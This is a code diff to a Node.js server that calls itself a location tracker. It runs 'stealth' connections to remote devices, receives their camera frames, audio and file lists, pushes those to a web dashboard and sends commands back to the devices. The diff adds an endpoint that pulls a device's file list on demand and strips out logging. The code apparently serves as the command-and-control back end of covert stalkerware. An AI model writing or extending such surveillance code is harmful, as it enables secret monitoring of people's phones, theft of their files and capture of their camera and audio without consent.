@@ -9,9 +9,9 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 const deviceCommands = new Map();
-const locations = new Map();
 const stealthConnections = new Map();
 const webClients = new Set();
+const deviceFileCache = new Map();
 
 console.log("Starting location tracker server...");
 
@@ -70,27 +70,11 @@ function broadcastToWebClients(obj) {
 wss.on("connection", (ws, req) => {
   const url = new URL(req.url, `http://${req.headers.host}`);
   const pathname = url.pathname;
-
   let deviceId = url.searchParams.get("deviceId");
   
   if (pathname.startsWith("/ws/live")) {
     webClients.add(ws);
-    console.log(`Web client connected for device ${deviceId}. Total web clients: ${webClients.size}`);
-
-    ws.on("message", (rawData) => {
-      try {
-        const command = JSON.parse(rawData.toString());
-        
-        if (command.action === 'GET_FILES' && command.deviceId) {
-          const deviceInfo = stealthConnections.get(command.deviceId);
-          if (deviceInfo && deviceInfo.ws && deviceInfo.ws.readyState === WebSocket.OPEN) {
-            deviceInfo.ws.send(JSON.stringify({ action: 'GET_FILES' }));
-          }
-        }
-      } catch (e) {
-        console.error('Error processing web client message:', e);
-      }
-    });
+    console.log(`Web client connected. Total: ${webClients.size}`);
 
     ws.on("close", () => {
       webClients.delete(ws);
@@ -98,57 +82,46 @@ wss.on("connection", (ws, req) => {
     });
 
     ws.on("error", (err) => {
-      console.error("Web client WebSocket error:", err);
+      console.error("Web client error:", err);
     });
     
   } else if (deviceId && pathname.startsWith("/ws/stealth")) {
     ws.deviceId = deviceId;
-    stealthConnections.set(deviceId, { ws, lastSeen: Date.now(), files: [] });
-    console.log(`Device ${deviceId} connected`);
+    stealthConnections.set(deviceId, { ws, lastSeen: Date.now() });
+    console.log(`📱 Device ${deviceId} connected`);
 
     ws.on("message", (rawData) => {
-    try {
-        const dataStr = rawData.toString();
-        const msg = JSON.parse(dataStr);
+      try {
+        const msg = JSON.parse(rawData.toString());
         
         if (msg.type === 'ping') {
-            console.log(`Ping from ${deviceId}`);
-            return;
+          console.log(`💓 Ping from ${deviceId}`);
+          return;
         }
         
         if (msg.type === 'file_list') {
-            const deviceInfo = stealthConnections.get(deviceId);
-            if (deviceInfo) {
-                deviceInfo.files = msg.files;
-                deviceInfo.lastFileUpdate = Date.now();
-            }
-            console.log(`📁 Received ${msg.files.length} files from ${deviceId}`);
+          deviceFileCache.set(deviceId, {
+            files: msg.files,
+            timestamp: Date.now()
+          });
+          console.log(`📁 Received ${msg.files.length} files from ${deviceId}`);
+          return;
         }
         
-        // СОХРАНЯЕМ ПОСЛЕДНИЙ КАДР ДЛЯ HTTP POLLING
         if (msg.type === 'image') {
           const deviceInfo = stealthConnections.get(deviceId);
           if (deviceInfo) {
             deviceInfo.latestImage = msg.data;
             deviceInfo.latestImageTime = Date.now();
           }
-          console.log(`Broadcasting image from ${deviceId} to ${webClients.size} web clients`);
         }
         
-        if (msg.type === 'audio') {
-          console.log(`Broadcasting audio from ${deviceId} to ${webClients.size} web clients`);
-        }
-        
-        const broadcast = {
-          type: msg.type || "message",
+        broadcastToWebClients({
+          type: msg.type,
           deviceId: deviceId,
           data: msg.data,
-          timestamp: msg.timestamp || Date.now(),
-          files: msg.files
-        };
-        
-        broadcastToWebClients(broadcast);
-        console.log(`Message from ${deviceId}: ${msg.type}`);
+          timestamp: msg.timestamp || Date.now()
+        });
         
       } catch (err) {
         console.error(`Error from device ${deviceId}:`, err);
@@ -161,11 +134,10 @@ wss.on("connection", (ws, req) => {
     });
 
     ws.on("error", (err) => {
-      console.error(`Device WebSocket error (${deviceId}):`, err);
+      console.error(`Device error (${deviceId}):`, err);
     });
     
   } else {
-    console.log(`Unknown WebSocket connection from ${pathname}`);
     ws.close();
   }
 });
@@ -178,17 +150,41 @@ app.post("/api/login", (req, res) => {
   return res.status(401).json({ success: false, error: "Invalid credentials" });
 });
 
+app.get('/api/device/:deviceId/files/:token', (req, res) => {
+  const { deviceId, token } = req.params;
+  
+  if (token !== SECRET_TOKEN) {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+  
+  const cached = deviceFileCache.get(deviceId);
+  if (cached && (Date.now() - cached.timestamp < 60000)) {
+    return res.json({ files: cached.files });
+  }
+  
+  const device = stealthConnections.get(deviceId);
+  if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
+    device.ws.send(JSON.stringify({ action: 'get_files' }));
+    
+    setTimeout(() => {
+      const updated = deviceFileCache.get(deviceId);
+      res.json({ files: updated ? updated.files : [] });
+    }, 2000);
+  } else {
+    res.json({ files: [] });
+  }
+});
+
 app.get('/api/device/:deviceId/command/:token', (req, res) => {
   const { deviceId, token } = req.params;
   
-  if (token !== 'your_secret_key_123') {
+  if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: "Forbidden" });
   }
   
   const command = deviceCommands.get(deviceId);
   
   if (command && (Date.now() - command.timestamp) < 30000) {
-    console.log(`✓ Delivering command to ${deviceId}: ${command.action}`);
     deviceCommands.delete(deviceId);
     return res.json({ 
       action: command.action, 
@@ -202,10 +198,6 @@ app.get('/api/device/:deviceId/command/:token', (req, res) => {
 app.post("/api/device/command", (req, res) => {
   const { device_id, command, token } = req.body;
   
-  console.log(`=== COMMAND REQUEST ===`);
-  console.log(`Device ID: ${device_id}`);
-  console.log(`Command: ${command}`);
-  
   if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: "Forbidden" });
   }
@@ -215,22 +207,15 @@ app.post("/api/device/command", (req, res) => {
     timestamp: Date.now()
   });
   
-  console.log(`✓ Command queued for HTTP polling: ${command}`);
-  
   const entry = stealthConnections.get(device_id);
   if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
-    try {
-      entry.ws.send(JSON.stringify({ 
-        action: command.toLowerCase(), 
-        timestamp: Date.now() 
-      }));
-      console.log(`✓ Also sent via WebSocket`);
-    } catch (err) {
-      console.error("WebSocket send failed:", err);
-    }
+    entry.ws.send(JSON.stringify({ 
+      action: command.toLowerCase(), 
+      timestamp: Date.now() 
+    }));
   }
   
-  return res.json({ success: true, method: 'http_polling' });
+  return res.json({ success: true });
 });
 
 app.post("/api/camera/image", (req, res) => {
@@ -239,7 +224,6 @@ app.post("/api/camera/image", (req, res) => {
 
   const { type, device_id, data, timestamp } = req.body;
   
-  // Сохраняем последний кадр
   const deviceInfo = stealthConnections.get(device_id);
   if (deviceInfo && type === 'image') {
     deviceInfo.latestImage = data;
@@ -382,7 +366,6 @@ app.get("/api/device/:deviceId/:token", async (req, res) => {
   }
 });
 
-// HTTP POLLING ENDPOINT ДЛЯ ПОЛУЧЕНИЯ ПОСЛЕДНЕГО КАДРА
 app.get('/api/device/:deviceId/latest-image', (req, res) => {
   const deviceId = req.params.deviceId;
   const deviceInfo = stealthConnections.get(deviceId);
@@ -451,5 +434,3 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-
-
